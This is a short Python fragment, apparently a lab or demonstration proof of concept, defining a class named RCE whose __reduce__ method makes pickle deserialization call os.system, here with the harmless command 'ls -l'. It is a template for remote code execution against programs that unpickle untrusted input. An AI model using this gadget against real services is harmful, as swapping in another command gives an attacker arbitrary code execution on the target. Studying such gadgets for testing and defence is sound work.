import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('ls -l')
        return os.system, (cmd,)

